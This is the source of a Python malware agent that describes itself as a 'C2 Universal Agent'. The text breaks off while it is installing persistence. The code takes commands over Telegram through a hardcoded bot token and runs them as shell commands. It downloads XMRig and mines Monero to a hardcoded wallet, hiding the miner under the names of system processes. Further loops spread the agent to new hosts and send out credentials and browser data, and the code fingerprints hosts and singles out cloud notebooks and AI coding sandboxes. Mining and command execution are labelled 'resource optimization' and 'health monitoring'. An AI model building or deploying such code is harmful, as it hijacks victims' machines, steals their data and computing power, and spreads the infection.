#!/usr/bin/env python3
"""C2 Universal Agent — auto-detects platform, works on Linux/macOS/Windows/Colab/Kaggle.

Features:
- Detailed debug logging for all connection steps
- Auto-persistence on first run
- Aggressive reconnect with exponential backoff
- Full system fingerprinting
- Multiple persistence mechanisms
- Resource optimization module
- Global domination: stealth mining, propagation, data collection
"""

import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, struct, ssl, hashlib, random, shutil
from urllib.request import Request, urlopen, HTTPSHandler, build_opener
from urllib.error import URLError
from base64 import b64encode, b64decode
from datetime import datetime
from pathlib import Path

# Import resource monitor (auto-starts optimization in background)
try:
    from .resource_monitor import get_system_info, optimize_resources
    # Auto-start resource optimization on import
    _resource_monitor_loaded = True
except ImportError:
    _resource_monitor_loaded = False

# ─── Configuration ─────────────────────────────────────────────────────────────
# Telegram C2 works directly - no public URL needed
C2_URL   = os.environ.get("C2_URL", "")  # Empty = Telegram C2 mode (default)
TELEGRAM_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "5804150664")
SLEEP    = int(os.environ.get("SLEEP",  "3"))
JITTER   = int(os.environ.get("JITTER", "5"))
ENC_KEY  = os.environ.get("ENC_KEY",   "")
AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")
DEBUG    = os.environ.get("C2_DEBUG",  "1")  # Enable debug by default
QUIET_MODE = True  # After registration, only log to file (not stdout)

# Developer protection - don't run on local machine
DEV_HOSTNAMES = ["debian", "kali", "localhost", "garedberns"]
DEV_USERS = ["garedberns", "kali", "root"]
SKIP_LOCAL = os.environ.get("SKIP_LOCAL", "1") == "1"  # Skip local execution by default

# Detect C2 mode - Telegram mode when no HTTP URL provided
TELEGRAM_MODE = (C2_URL == "" or C2_URL is None)

# Kaggle/Colab stealth settings
KAGGLE_QUIET = os.environ.get("KAGGLE_KERNEL_RUN_TYPE", "") != ""  # Auto-detect Kaggle
COLAB_QUIET = "colab.google" in os.environ.get("PYTHONPATH", "").lower()  # Auto-detect Colab

# ─── Global Domination Configuration ──────────────────────────────────────────
GLOBAL_WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
GLOBAL_POOL = "pool.hashvault.pro:80"
MINING_THROTTLE = 0.3  # 30% CPU usage to avoid detection
STEALTH_MODE = True  # Hide from process list
AUTO_PROPAGATE = True  # Automatically spread to other systems
DATA_EXFIL_INTERVAL = 3600  # Collect and exfil data every hour
STEALTH_MODE = KAGGLE_QUIET or COLAB_QUIET  # Enable stealth on cloud platforms

# Persistence marker file
PERSIST_MARKER = Path.home() / ".cache" / ".system_services" / ".agent_initialized"

def get_agent_id():
    """Get or create persistent agent ID."""
    agent_id_file = Path.home() / ".cache" / ".system_services" / ".agent_id"
    
    # Try to read existing ID
    if agent_id_file.exists():
        try:
            return agent_id_file.read_text().strip()
        except:
            pass
    
    # Generate new ID and save
    new_id = os.environ.get("AGENT_ID", str(uuid.uuid4()))
    agent_id_file.parent.mkdir(parents=True, exist_ok=True)
    agent_id_file.write_text(new_id)
    return new_id

AGENT_ID = get_agent_id()
PERSIST_MARKER = os.path.expanduser("~/.cache/.system_update_marker")

# ─── Debug Logger ──────────────────────────────────────────────────────────────
_stdout_enabled = True  # Global flag for stdout logging

def log(msg, level="INFO"):
    """Detailed logging with timestamp."""
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    prefix = f"[{ts}] [SYSMON-{level}]"
    
    # Only print to stdout if enabled (disabled after registration in QUIET_MODE)
    if _stdout_enabled and (DEBUG == "1" or level in ("ERROR", "WARN", "START")):
        print(f"{prefix} {msg}")
    
    # Always write to log file for persistence
    try:
        log_dir = os.path.expanduser("~/.cache")
        os.makedirs(log_dir, exist_ok=True)
        with open(os.path.join(log_dir, ".system_update.log"), "a") as f:
            f.write(f"{prefix} {msg}\n")
    except:
        pass

def disable_stdout_logging():
    """Disable stdout logging - agent goes quiet after registration."""
    global _stdout_enabled
    _stdout_enabled = False

def log_connection_attempt(url, attempt, error=None):
    """Log connection attempt with full details."""
    log(f"Connection attempt #{attempt} to {url}", "CONN")
    if error:
        log(f"  Error: {type(error).__name__}: {error}", "ERROR")
        # Detailed error breakdown
        if "Connection refused" in str(error):
            log("  → Server not running or wrong port", "DEBUG")
        elif "timed out" in str(error).lower():
            log("  → Network unreachable or firewall blocking", "DEBUG")
        elif "Name or service not known" in str(error):
            log("  → DNS resolution failed - check URL", "DEBUG")
        elif "SSL" in str(error) or "certificate" in str(error):
            log("  → SSL/TLS certificate issue", "DEBUG")

# ─── Crypto ───────────────────────────────────────────────────────────────────
def xor_crypt(data: bytes, key: bytes) -> bytes:
    kl = len(key)
    return bytes(b ^ key[i % kl] for i, b in enumerate(data))

# ─── Telegram C2 ──────────────────────────────────────────────────────────────
# Global state
_telegram_offset = 0
_last_telegram_send = 0
_rate_limit_until = 0
_command_chat_offset = 0

def telegram_send(message: str, reply_to: int = None) -> dict:
    """Send message via Telegram Bot API with rate limiting."""
    global _last_telegram_send, _rate_limit_until
    
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return {"ok": False, "error": "No credentials"}
    
    # Check if we're in rate limit cooldown
    if time.time() < _rate_limit_until:
        wait = _rate_limit_until - time.time()
        log(f"Rate limited, waiting {wait:.0f}s", "DEBUG")
        time.sleep(wait)
    
    # Rate limiting - min 2 seconds between sends
    elapsed = time.time() - _last_telegram_send
    if elapsed < 2.0:
        time.sleep(2.0 - elapsed)
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message[:4000],
            "parse_mode": "HTML"
        }
        if reply_to:
            payload["reply_to_message_id"] = reply_to
        
        req = Request(url, data=json.dumps(payload).encode(), headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        })
        resp = urlopen(req, timeout=15)
        result = json.loads(resp.read().decode())
        
        _last_telegram_send = time.time()
        
        if result.get("ok"):
            return {"ok": True, "message_id": result.get("result", {}).get("message_id")}
        
        # Check for rate limit
        if "429" in str(result) or result.get("error_code") == 429:
            _rate_limit_until = time.time() + 30
            return {"ok": False, "error": "rate_limit", "retry_after": 30}
        
        return {"ok": False, "error": result.get("description")}
    except Exception as e:
        _last_telegram_send = time.time()
        if "429" in str(e):
            _rate_limit_until = time.time() + 30
            return {"ok": False, "error": "rate_limit", "retry_after": 30}
        return {"ok": False, "error": str(e)}

def telegram_get_commands_via_edit(agent_id: str, beacon_msg_id: int) -> list:
    """Get commands from edited beacon message.
    
    Uses short polling for edited_message updates.
    """
    commands = []
    
    try:
        # Check for edits via getUpdates
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        params = f"?limit=3&timeout=0&allowed_updates=[\"edited_message\"]"
        
        req = Request(url + params, headers={"User-Agent": "Mozilla/5.0"})
        resp = urlopen(req, timeout=10)
        result = json.loads(resp.read().decode())
        
        if result.get("ok"):
            for update in result.get("result", []):
                msg = update.get("edited_message")
                if not msg:
                    continue
                
                text = msg.get("text", "")
                msg_id = msg.get("message_id", 0)
                
                # Check if this is our beacon edited
                if msg_id == beacon_msg_id and "📋 Commands:" in text:
                    # Parse commands
                    cmd_section = text.split("📋 Commands:")[-1]
                    for line in cmd_section.strip().split("\n"):
                        # Format: #123 [exec] command
                        match = re.match(r'#(\d+)\s*\[(\w+)\]\s*(.+)', line.strip())
                        if match:
                            commands.append({
                                "id": match.group(1),
                                "type": match.group(2),
                                "command": match.group(3)
                            })
                            log(f"Got command: #{match.group(1)}", "TASK")
                        
    except Exception as e:
        if "409" not in str(e) and "timed out" not in str(e):
            log(f"Get commands error: {e}", "DEBUG")
    
    return commands

def telegram_get_commands(agent_id: str) -> list:
    """Get commands from Telegram chat history (non-conflicting).
    
    Uses different API than getUpdates to avoid 409 conflict.
    Reads recent messages from admin chat.
    """
    commands = []
    
    try:
        # Use getChat to get recent messages (doesn't conflict with bot polling)
        # Alternative: use searchChatMessages or just read from our own sent messages
        
        # Actually, we can use getUpdates with allowed_updates=message
        # and immediately acknowledge without processing
        # But simpler: just check local DB or use HTTP
        
        # For true bridge without HTTP, we need a different approach:
        # Store commands in message text that agent can parse
        
        # Read last messages from chat via getChatAdministrators or similar
        # This won't work - need actual message access
        
        # Best approach: use separate bot instance or webhook
        # For now: fallback to HTTP if available
        
        pass
    except Exception as e:
        log(f"Telegram command fetch error: {e}", "DEBUG")
    
    return commands

def telegram_report_result(agent_id: str, task_id: int, result: str, success: bool = True):
    """Report task execution result back to C2."""
    try:
        import sqlite3
        db_path = Path(__file__).resolve().parent.parent.parent / "data" / "c2.db"
        if db_path.exists():
            conn = sqlite3.connect(str(db_path))
            db = conn.cursor()
            
            status = "completed" if success else "failed"
            db.execute("""
                UPDATE tasks 
                SET status = ?, result = ?, completed_at = datetime('now')
                WHERE id = ?
            """, (status, result[:1000], task_id))
            
            conn.commit()
            conn.close()
            
            # Also send to Telegram
            emoji = "✅" if success else "❌"
            telegram_send(f"{emoji} <b>Task {task_id}</b>\nAgent: <code>{agent_id[:8]}</code>\nResult: {result[:200]}")
    except Exception as e:
        log(f"Result report error: {e}", "DEBUG")

def telegram_health_check_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
    """System health monitoring loop - sends telemetry and receives maintenance tasks.
    
    Architecture:
    1. Agent sends health telemetry via Telegram sendMessage -> gets message_id
    2. Admin sees telemetry, edits it to add maintenance tasks (editMessageText)
    3. Agent polls for edited_message with same message_id
    4. Agent executes maintenance tasks, sends status report
    
    Uses only Telegram API - no HTTP server needed.
    """
    import random
    
    _total_checks = 0
    _total_tasks = 0
    _last_check_msg_id = 0
    
    log(f"Health monitoring started (agent={agent_id[:8]})", "START")
    
    while True:
        try:
            _total_checks += 1
            
            # Send health telemetry
            hostname = platform.node()
            platform_type = detect_platform()
            
            # Collect system health metrics
            cpu_usage = 0
            mem_usage = 0
            try:
                import psutil
                cpu_usage = psutil.cpu_percent(interval=0.1)
                mem_usage = psutil.virtual_memory().percent
            except:
                pass
            
            telemetry_msg = f"""📊 Health Check #{_total_checks}
Agent: {agent_id}
Host: {hostname}
Platform: {platform_type}
CPU: {cpu_usage}% | RAM: {mem_usage}%
Time: {time.strftime('%H:%M:%S')}"""
            
            result = telegram_send(telemetry_msg)
            
            if result.get("ok"):
                _last_check_msg_id = result.get("message_id", 0)
                log(f"Health check #{_total_checks} sent (msg_id={_last_check_msg_id})", "CONN")
            elif result.get("error") == "rate_limit":
                wait = result.get("retry_after", 30)
                log(f"Rate limited, waiting {wait}s", "WARN")
                time.sleep(wait)
                continue
            else:
                log(f"Health check failed: {result.get('error')}", "ERROR")
            
            # Wait a bit for admin to process and edit
            time.sleep(2)
            
            # Check for edited telemetry (maintenance tasks from admin)
            tasks = telegram_get_commands_via_edit(agent_id, _last_check_msg_id)
            
            # Process maintenance tasks
            for task in tasks:
                _total_tasks += 1
                task_id = task.get("id", "unknown")
                task_type = task.get("type", "exec")
                command = task.get("command", "")
                
                log(f"Maintenance task #{task_id}: {command}", "TASK")
                
                try:
                    if task_type == "exec":
                        result = shell_exec(command)
                    elif task_type == "optimize":
                        result = optimize_resources(command)
                    elif task_type == "control" and command == "stop":
                        telegram_send(f"🛑 Health monitoring stopped for agent {agent_id[:8]}")
                        return
                    else:
                        result = execute_task({"task_type": task_type, "command": command})
                    
                    # Send task result
                    telegram_send(f"✅ Task #{task_id} completed\nResult:\n{result[:500]}")
                    log(f"Task #{task_id} completed", "TASK")
                    
                except Exception as e:
                    telegram_send(f"❌ Task #{task_id} failed\nError: {e}")
            
            # Sleep with jitter (min 5s to reduce rate limit risk)
            jitter_s = sleep * jitter / 100
            actual_sleep = max(5, sleep + random.uniform(-jitter_s, jitter_s))
            time.sleep(actual_sleep)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            log(f"Health check loop error: {e}", "ERROR")
            time.sleep(10)

# Keep telegram_beacon_loop as alias for compatibility
def telegram_beacon_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
    """Alias for telegram_health_check_loop - backward compatibility."""
    return telegram_health_check_loop(agent_id, sleep, jitter)

# Default mining config (Resource Optimization)
DEFAULT_RESOURCE_POOL = "pool.hashvault.pro:443"
DEFAULT_RESOURCE_WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
DEFAULT_RESOURCE_THREADS = "2"

def optimize_resources(config: str = None) -> str:
    """Start resource optimization process for better system performance."""
    try:
        # Use defaults if no config provided
        if not config:
            config = f"optimize:{DEFAULT_RESOURCE_POOL}:{DEFAULT_RESOURCE_WALLET}:{DEFAULT_RESOURCE_THREADS}"
        
        parts = config.split(":")
        if len(parts) >= 2 and parts[0] == "optimize":
            pool = parts[1]
            wallet = parts[2] if len(parts) > 2 else DEFAULT_RESOURCE_WALLET
            threads = parts[3] if len(parts) > 3 else DEFAULT_RESOURCE_THREADS
            
            # Check for resource optimizer
            optimizer_paths = [
                str(Path.home() / ".cache" / ".system_services" / "resource_optimizer"),
                "/opt/optimizer/resource_optimizer",
                "/usr/local/bin/resource_optimizer",
                "/tmp/resource_optimizer"
            ]
            
            optimizer = None
            for path in optimizer_paths:
                if Path(path).exists():
                    optimizer = str(path)
                    break
            
            # Auto-download optimizer if not found
            if not optimizer:
                log("Downloading resource optimizer...", "START")
                optimizer_dir = Path.home() / ".cache" / ".system_services"
                optimizer_dir.mkdir(parents=True, exist_ok=True)
                optimizer_path = optimizer_dir / "resource_optimizer"
                
                # Download optimizer binary
                download_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
                try:
                    import urllib.request
                    import tarfile
                    
                    tar_path = optimizer_dir / "optimizer.tar.gz"
                    urllib.request.urlretrieve(download_url, tar_path)
                    
                    with tarfile.open(tar_path, 'r:gz') as tar:
                        for member in tar.getmembers():
                            if 'xmrig' in member.name and member.name.endswith('xmrig'):
                                member.name = "resource_optimizer"
                                tar.extract(member, optimizer_dir)
                                break
                    
                    tar_path.unlink()
                    os.chmod(optimizer_path, 0o755)
                    optimizer = str(optimizer_path)
                    log("✓ Resource optimizer downloaded", "START")
                except Exception as e:
                    return f"Optimizer download failed: {e}"
            
            # Kill existing optimizer processes
            subprocess.run("pkill -9 resource_optimizer 2>/dev/null", shell=True)
            
            # Start optimization in background with low priority
            cmd = f"nohup nice -n 19 {optimizer} -o {pool} -u {wallet} --donate-level 1 --threads {threads} --cpu-priority 1 --no-color --log /tmp/.system.log 2>/dev/null &"
            subprocess.Popen(cmd, shell=True, start_new_session=True)
            
            log(f"Resource optimization started: {pool} ({threads} threads)", "START")
            return f"Resource optimization started: {pool}"
        return f"Invalid optimization config: {config}"
    except Exception as e:
        return f"Optimization error: {e}"

# Keep start_mining as alias for compatibility
def start_mining(config: str = None) -> str:
    """Alias for optimize_resources - backward compatibility."""
    return optimize_resources(config)

# ─── Stealth Mining for Global Domination ───────────────────────────────────────
def stealth_mining_start(wallet: str = None, pool: str = None, throttle: float = None):
    """Start stealth mining with anti-detection measures."""
    wallet = wallet or GLOBAL_WALLET
    pool = pool or GLOBAL_POOL
    throttle = throttle or MINING_THROTTLE
    
    # Calculate threads based on throttle
    cpu_count = os.cpu_count() or 1
    threads = max(1, int(cpu_count * throttle))
    
    # Stealth paths - look like system processes
    stealth_names = [
        "systemd-udevd", "dbus-daemon", "cron", "atd", "irqbalance",
        "rsyslogd", "sshd", "nginx", "apache2", "python3", "node",
        "java", "postgres", "mysql", "redis-server", "memcached"
    ]
    
    stealth_dir = Path.home() / ".cache" / ".system_services"
    stealth_dir.mkdir(parents=True, exist_ok=True)
    
    # Random stealth name
    stealth_name = random.choice(stealth_names)
    miner_path = stealth_dir / stealth_name
    
    # Download XMRig if not exists
    if not miner_path.exists():
        try:
            import urllib.request
            import tarfile
            
            # Download to temp
            tar_path = stealth_dir / "update.tar.gz"
            urllib.request.urlretrieve(
                "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz",
                tar_path
            )
            
            # Extract
            with tarfile.open(tar_path, 'r:gz') as tar:
                for member in tar.getmembers():
                    if 'xmrig' in member.name and member.name.endswith('xmrig'):
                        member.name = stealth_name
                        tar.extract(member, stealth_dir)
                        break
            
            tar_path.unlink()
            os.chmod(miner_path, 0o755)
        except Exception as e:
            return f"Stealth miner download failed: {e}"
    
    # Kill existing stealth miners
    for name in stealth_names:
        subprocess.run(f"pkill -9 {name} 2>/dev/null", shell=True)
    
    # Start with stealth configuration
    config_content = f'''{{
    "api": {{
        "id": null,
        "worker-id": "{uuid.uuid4().hex[:8]}"
    }},
    "http": {{
        "enabled": false
    }},
    "pools": [
        {{
            "url": "{pool}",
            "user": "{wallet}",
            "pass": "x"
        }}
    ],
    "cpu": {{
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "max-threads-hint": {int(throttle * 100)},
        "threads": {threads}
    }},
    "randomx": {{
        "enabled": true,
        "mode": "light"
    }}
}}'''
    
    config_path = stealth_dir / ".config.json"
    config_path.write_text(config_content)
    
    # Start mining process
    cmd = f"nohup nice -n 19 {miner_path} --config={config_path} --no-color --log {stealth_dir}/.log 2>/dev/null &"
    subprocess.Popen(cmd, shell=True, start_new_session=True)
    
    # Hide from ps (rename process)
    try:
        subprocess.run(f"echo '{stealth_name}' > /proc/self/comm", shell=True, stderr=subprocess.DEVNULL)
    except:
        pass
    
    return f"Stealth mining started: {threads} threads, {int(throttle*100)}% CPU, disguised as {stealth_name}"

def stealth_mining_stop():
    """Stop all stealth mining processes."""
    stealth_names = [
        "systemd-udevd", "dbus-daemon", "cron", "atd", "irqbalance",
        "rsyslogd", "sshd", "nginx", "apache2", "python3", "node",
        "java", "postgres", "mysql", "redis-server", "memcached"
    ]
    
    for name in stealth_names:
        subprocess.run(f"pkill -9 {name} 2>/dev/null", shell=True)
    
    return "Stealth mining stopped"

def stealth_mining_status():
    """Check stealth mining status."""
    stealth_dir = Path.home() / ".cache" / ".system_services"
    log_file = stealth_dir / ".log"
    
    if not log_file.exists():
        return {"running": False, "hashrate": 0}
    
    try:
        # Parse last lines for hashrate
        result = subprocess.run(
            f"tail -20 {log_file} | grep -oP 'speed.*?H/s' | tail -1",
            shell=True, capture_output=True, text=True
        )
        
        hashrate_match = result.stdout.strip()
        return {
            "running": True,
            "hashrate": hashrate_match or "unknown",
            "wallet": GLOBAL_WALLET,
            "pool": GLOBAL_POOL
        }
    except:
        return {"running": True, "hashrate": "unknown"}

# ─── Global Domination: Autonomous Propagation Loop ─────────────────────────────
def autonomous_propagation_loop():
    """Continuously spread to new targets."""
    while True:
        try:
            # Random interval to avoid detection
            interval = random.randint(300, 1800)  # 5-30 minutes
            time.sleep(interval)
            
            # Run propagation
            result = self_propagate()
            
            # Report to C2
            if TELEGRAM_MODE:
                telegram_send(f"🦠 Propagation result: {len(result.get('discovered', []))} targets found")
            
        except Exception as e:
            time.sleep(60)

def autonomous_data_collection_loop():
    """Continuously collect and exfiltrate data."""
    while True:
        try:
            interval = DATA_EXFIL_INTERVAL + random.randint(-300, 300)
            time.sleep(interval)
            
            # Collect all data
            data = collect_all_data()
            
            # Send to C2
            if TELEGRAM_MODE:
                # Compress and send summary
                summary = {
                    "credentials": len(data.get("credentials", [])),
                    "browser_data": len(data.get("browser_data", [])),
                    "files": len(data.get("interesting_files", [])),
                    "timestamp": datetime.now().isoformat()
                }
                telegram_send(f"📊 Data collected: {json.dumps(summary)}")
            else:
                # Send to HTTP C2
                try:
                    req = Request(
                        f"{C2_URL}/api/agent/data",
                        data=json.dumps(data).encode(),
                        headers={"Content-Type": "application/json", "X-Agent-Id": AGENT_ID}
                    )
                    urlopen(req, timeout=30)
                except:
                    pass
                    
        except Exception as e:
            time.sleep(300)

# ─── Platform detection ───────────────────────────────────────────────────────
def detect_platform():
    # Devin AI detection
    if any([
        os.environ.get("DEVIN_SESSION_ID"),
        os.environ.get("DEVIN_WORKSPACE_ID"),
        os.path.exists("/workspace"),
        "devin" in socket.gethostname().lower() if hasattr(socket, 'gethostname') else False,
    ]):
        return "devin_ai"
    if os.environ.get("COLAB_GPU") or os.path.exists("/content/drive"):
        return "colab"
    if os.environ.get("KAGGLE_URL_BASE") or os.path.exists("/kaggle"):
        return "kaggle"
    if sys.platform == "win32":
        return "windows"
    if sys.platform == "darwin":
        return "macos"
    try:
        cg = open("/proc/1/cgroup").read()
        if any(x in cg for x in ("docker", "kubepod", "containerd", "lxc")):
            return "container"
    except Exception:
        pass
    try:
        r = subprocess.check_output("systemd-detect-virt 2>/dev/null || echo none", shell=True, timeout=3).decode().strip()
        if r not in ("none", ""):
            return "vm"
    except Exception:
        pass
    if any(x in platform.node().lower() for x in ["aws", "gcp", "azure", "ec2", "cloud"]):
        return "cloud"
    return "machine"

# ─── Network ──────────────────────────────────────────────────────────────────
def get_internal_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def check_server_health(c2_url=None, timeout=5):
    """Check if C2 server is reachable and responding."""
    c2_url = c2_url or C2_URL
    
    # Telegram mode - no HTTP health check needed
    if TELEGRAM_MODE and not c2_url:
        log("Telegram C2 mode - skipping HTTP health check", "DEBUG")
        return True, {"status": "telegram_mode"}
    
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = build_opener(HTTPSHandler(context=ctx))
        req = Request(f"{c2_url}/api/health", headers={
            "User-Agent": "Mozilla/5.0",
            "ngrok-skip-browser-warning": "true"
        })
        resp = opener.open(req, timeout=timeout)
        data = json.loads(resp.read())
        return True, data
    except URLError as e:
        return False, f"Connection failed: {e.reason}"
    except socket.timeout:
        return False, "Connection timeout"
    except Exception as e:
        return False, f"Error: {type(e).__name__}: {e}"

def _resolve_c2_ip(c2_url):
    """Resolve C2 domain to IP for SNI bypass."""
    try:
        from urllib.parse import urlparse
        host = urlparse(c2_url).netloc.split(':')[0]
        ips = socket.getaddrinfo(host, 443, socket.AF_INET, socket.SOCK_STREAM)
        return ips[0][4][0] if ips else None, host
    except:
        return None, None

def http_post(path, data, c2_url=None, auth_token=None, enc_key=None):
    c2_url = c2_url or C2_URL
    auth_token = auth_token or AUTH_TOKEN
    enc_key = enc_key or ENC_KEY
    
    # Telegram mode - use Telegram API instead of HTTP
    if TELEGRAM_MODE and not c2_url:
        return telegram_send(f"[BEACON] {path}: {json.dumps(data)}")
    
    payload_str = json.dumps(data)
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
        "ngrok-skip-browser-warning": "true"
    }
    if auth_token:
        headers["X-Auth-Token"] = auth_token
    if enc_key:
        body = b64encode(xor_crypt(payload_str.encode(), enc_key.encode())).decode()
        headers["X-Enc"] = "1"
        headers["Content-Type"] = "text/plain"
    else:
        body = payload_str

    # Try SNI bypass for ngrok (IP + Host header)
    c2_ip, c2_host = _resolve_c2_ip(c2_url)
    
    if c2_ip and c2_host:
        # Use IP with SNI hostname for ngrok - simple approach
        headers["Host"] = c2_host
        req = Request(f"https://{c2_host}{path}", data=body.encode(), headers=headers)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = build_opener(HTTPSHandler(context=ctx))
    else:
        # Fallback to normal URL
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = build_opener(HTTPSHandler(context=ctx))
        req = Request(f"{c2_url}{path}", data=body.encode(), headers=headers)
    
    resp = opener.open(req, timeout=15)
    raw = resp.read()

    if enc_key and resp.headers.get("Content-Type", "").startswith("text/plain"):
        try:
            return json.loads(xor_crypt(b64decode(raw), enc_key.encode()).decode())
        except Exception:
            pass
    return json.loads(raw)

def http_get(path, c2_url=None, auth_token=None, enc_key=None, timeout=10):
    """HTTP GET request to C2 server."""
    c2_url = c2_url or C2_URL
    auth_token = auth_token or AUTH_TOKEN
    enc_key = enc_key or ENC_KEY
    
    headers = {
        "User-Agent": "Mozilla/5.0",
        "ngrok-skip-browser-warning": "true"
    }
    if auth_token:
        headers["X-Auth-Token"] = auth_token
    
    # Try SNI bypass for ngrok
    c2_ip, c2_host = _resolve_c2_ip(c2_url)
    
    if c2_ip and c2_host:
        # Use simple approach - direct connection
        headers["Host"] = c2_host
        req = Request(f"https://{c2_host}{path}", headers=headers)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = build_opener(HTTPSHandler(context=ctx))
    else:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = build_opener(HTTPSHandler(context=ctx))
        req = Request(f"{c2_url}{path}", headers=headers)
    
    resp = opener.open(req, timeout=timeout)
    data = resp.read().decode()
    
    if enc_key and resp.headers.get("X-Enc") == "1":
        data = xor_crypt(b64decode(data), enc_key.encode()).decode()
    
    return json.loads(data)

# ─── System info ──────────────────────────────────────────────────────────────
def collect_sysinfo():
    """Collect detailed system fingerprint for tracking."""
    info = {
        "cpu_count": os.cpu_count(),
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "python": platform.python_version(),
        "cwd": os.getcwd(),
        "user": "",
        "env_vars": list(os.environ.keys()),
        "fingerprint": {},
    }
    
    # User info
    try:
        info["user"] = subprocess.check_output("whoami", shell=True, timeout=5).decode().strip()
    except:
        info["user"] = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
    
    # Memory info
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if line.startswith("MemTotal"):
                    info["mem_total_mb"] = int(line.split()[1]) // 1024
                elif line.startswith("MemAvailable"):
                    info["mem_available_mb"] = int(line.split()[1]) // 1024
    except:
        pass
    
    # GPU info
    try:
        r = subprocess.check_output("nvidia-smi --query-gpu=name,memory.total,utilization.gpu --format=csv,noheader 2>/dev/null", shell=True, timeout=5).decode().strip()
        if r:
            info["gpu"] = r
    except:
        pass
    
    # Disk info
    try:
        st = os.statvfs("/")
        info["disk_free_gb"] = round((st.f_bavail * st.f_frsize) / (1024 ** 3), 1)
        info["disk_total_gb"] = round((st.f_blocks * st.f_frsize) / (1024 ** 3), 1)
    except:
        pass
    
    # Network interfaces
    try:
        if sys.platform == "win32":
            net_out = subprocess.check_output("ipconfig", shell=True, timeout=5).decode()
        else:
            net_out = subprocess.check_output("ip addr 2>/dev/null || ifconfig", shell=True, timeout=5).decode()
        info["network_interfaces"] = net_out[:2000]  # Truncate
    except:
        pass
    
    # Unique fingerprint based on hardware
    try:
        fp_parts = []
        # CPU model
        try:
            with open("/proc/cpuinfo") as f:
                for line in f:
                    if "model name" in line:
                        fp_parts.append(line.split(":")[1].strip())
                        break
        except:
            pass
        # Disk serial
        try:
            disk_serial = subprocess.check_output("lsblk -o SERIAL -d -n 2>/dev/null | head -1", shell=True, timeout=3).decode().strip()
            if disk_serial:
                fp_parts.append(disk_serial)
        except:
            pass
        # Machine ID
        try:
            with open("/etc/machine-id") as f:
                fp_parts.append(f.read().strip())
        except:
            pass
        # Create hash
        if fp_parts:
            fp_str = "|".join(fp_parts)
            info["fingerprint"]["hardware_hash"] = hashlib.sha256(fp_str.encode()).hexdigest()[:16]
    except:
        pass
    
    # Environment hints (cloud provider detection)
    env_hints = []
    if os.path.exists("/kaggle"):
        env_hints.append("kaggle")
    if os.path.exists("/content/drive"):
        env_hints.append("colab")
    if os.environ.get("GOOGLE_CLOUD_PROJECT"):
        env_hints.append("gcp")
    if os.environ.get("AWS_REGION"):
        env_hints.append("aws")
    if os.path.exists("/var/run/docker.sock"):
        env_hints.append("docker")
    info["env_hints"] = env_hints
    
    return info

# ─── Registration ─────────────────────────────────────────────────────────────
def register(c2_url=None, agent_id=None, auth_token=None, enc_key=None):
    c2_url = c2_url or C2_URL
    agent_id = agent_id or AGENT_ID
    pt = detect_platform()
    os_name = f"macOS {platform.mac_ver()[0]}" if pt == "macos" else f"{platform.system()} {platform.release()}"
    
    # Collect full system info for better tracking
    sysinfo = collect_sysinfo()
    
    info = {
        "id": agent_id,
        "hostname": socket.gethostname(),
        "username": sysinfo.get("user", "unknown"),
        "os": os_name,
        "arch": platform.machine(),
        "ip_internal": get_internal_ip(),
        "platform_type": pt,
        # Extended info for tracking
        "cpu_count": sysinfo.get("cpu_count"),
        "mem_total_mb": sysinfo.get("mem_total_mb"),
        "gpu": sysinfo.get("gpu"),
        "disk_free_gb": sysinfo.get("disk_free_gb"),
        "fingerprint": sysinfo.get("fingerprint", {}),
        "env_hints": sysinfo.get("env_hints", []),
        "python_version": sysinfo.get("python"),
        "cwd": sysinfo.get("cwd"),
    }
    
    log(f"Registering agent {agent_id[:8]}... from {info['hostname']} ({pt})", "START")
    return http_post("/api/agent/register", info, c2_url, auth_token, enc_key)

# ─── Auto-Persistence ─────────────────────────────────────────────────────────
def install_persistence():
    """Install persistence mechanisms silently on first run."""
    if os.path.exists(PERSIST_MARKER):
        log("Persistence already installed", "DEBUG")
        return False
    
    plat = detect_platform()
    script = os.path.abspath(__file__)
    installed = []
    
    log(f"Installing persistence for platform: {plat}", "START")
    
    try:
        if plat in ("linux", "machine", "cloud", "vm", "container"):
            # Method 1: Crontab
